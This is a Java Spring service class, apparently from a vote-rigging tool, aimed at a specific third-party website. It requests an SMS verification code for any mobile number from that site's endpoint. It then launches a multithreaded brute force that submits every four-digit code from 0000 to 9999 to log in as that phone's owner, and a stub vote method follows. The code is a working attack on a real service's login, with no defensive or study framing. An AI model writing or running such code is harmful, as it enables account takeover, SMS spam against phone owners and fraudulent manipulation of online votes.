package com.tupelo.vote.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.tupelo.vote.dto.BaseResp;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.core.task.TaskExecutor;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import javax.annotation.Resource;

/**
 * @Author: caichuang
 * @Date: 2023/5/25 15:13
 */
@Service
@Slf4j
public class SendService {


	@Resource
	private TaskExecutor voteExecutor;

	@Resource
	private LoginService loginService;
	@Resource
	private RestTemplate restTemplate;


	/**
	 * 发送短信
	 * @param mobile
	 */
	public Boolean sendSms(String mobile) {
		String url = "https://www.zhibozx.cn/public/index.php/mobile/ajax/sms_code.html?mobile="+mobile;
		ResponseEntity<String> entity = restTemplate.getForEntity(url, String.class);
		JSONObject jsonObject = JSONObject.parseObject(entity.getBody());
		Integer code = jsonObject.getInteger("code");
		String message = jsonObject.getString("message");
		if(code==1 && "成功".equals(message)){
			return true;
		}
		return false;
	}

	/**
	 * 登录
	 * @param mobile
	 * @return
	 */
	public void loginAndVote(String mobile){
		// 暴力破解 0000 - 9999 验证码 开启多线程尝试
		for (int i = 0; i < 10; i++) {
			for (int i1 = 0; i1 < 10; i1++) {
				for (int i2 = 0; i2 < 10; i2++) {
					for (int i3 = 0; i3 < 10; i3++) {
						String code = String.valueOf(i) + i1 + i2 + i3;
						voteExecutor.execute(()->{
							loginService.login(code,mobile);
						});
					}
				}
			}
		}
	}


	public void vote(String memberId){

	}

}
